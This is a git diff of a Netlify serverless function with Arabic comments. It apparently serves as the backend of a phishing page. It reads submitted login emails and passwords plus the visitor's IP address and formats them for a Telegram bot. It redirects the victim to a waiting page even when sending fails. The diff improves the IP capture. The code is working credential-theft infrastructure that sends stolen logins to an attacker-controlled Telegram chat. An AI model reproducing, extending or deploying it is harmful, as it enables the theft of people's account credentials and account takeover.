@@ -1,8 +1,13 @@
-// نستخدم مكتبة node-fetch لإرسال طلبات HTTP (لاستدعاء Telegram API)
-// تأكد من تشغيل npm install node-fetch في جذر مشروعك إذا كنت تختبر محليًا
-// Netlify Functions تدعمها تلقائيًا في بيئتها
-
 const fetch = require('node-fetch');
+
+// دالة مساعدة لجلب IP من رؤوس مختلفة (لبيئة Netlify)
+const getClientIp = (headers) => {
+    // محاولة التقاط IP من الرؤوس الأكثر موثوقية في Netlify
+    return headers['x-nf-client-connection-ip'] || 
+           headers['client-ip'] || 
+           headers['x-forwarded-for'] ||
+           'غير متوفر';
+};
 
 // دالة ترميز الأحرف الخاصة بـ MarkdownV2 لـ Telegram
 const escapeMarkdownV2 = (text) => {
@@ -12,28 +17,26 @@ const escapeMarkdownV2 = (text) => {
         '#': '\\#', '+': '\\+', '-': '\\-', '=': '\\=', '|': '\\|', 
         '{': '\\{', '}': '\\}', '.': '\\.', '!': '\\!'
     };
-    // لا نحتاج لترميمز \n لأنها لا تفسد تنسيق MarkdownV2 هنا
     return text.replace(/[\\_*[\]()~`>#+\-=|{}.!]/g, match => replacements[match]);
 };
 
 
 exports.handler = async (event, context) => {
-    // التحقق من نوع الطلب (يجب أن يكون POST من النموذج)
+    
     if (event.httpMethod !== "POST") {
-        return {
-            statusCode: 405,
-            body: "Method Not Allowed",
-        };
+        return { statusCode: 405, body: "Method Not Allowed" };
     }
     
-    // فك ترميز بيانات النموذج التي تأتي كـ URL-encoded
+    // فك ترميز بيانات النموذج
     const bodyParams = new URLSearchParams(event.body);
     
     const email = bodyParams.get('login_email') || 'غير متوفر';
     const password = bodyParams.get('login_password') || 'غير متوفر';
-    const ip = event.headers['client-ip'] || 'غير متوفر'; // Netlify يزود IP هنا
+    
+    // التقاط IP باستخدام الدالة المساعدة
+    const ip = getClientIp(event.headers); 
 
-    // تطبيق الترميز
+    // تطبيق الترميز على المتغيرات
     const safe_email = escapeMarkdownV2(email);
     const safe_password = escapeMarkdownV2(password);
     const safe_ip = escapeMarkdownV2(ip);
@@ -50,13 +53,8 @@ exports.handler = async (event, context) => {
     
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
         console.error("Telegram credentials missing in environment variables.");
-        // بالرغم من الخطأ، سنقوم بالتحويل لتجنب توقف المستخدم
-        return {
-            statusCode: 303,
-            headers: {
-                Location: '/waiting.html',
-            },
-        };
+        // التحويل إلى الصفحة التالية حتى في حالة الخطأ
+        return { statusCode: 303, headers: { Location: '/waiting.html' } };
     }
 
     const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
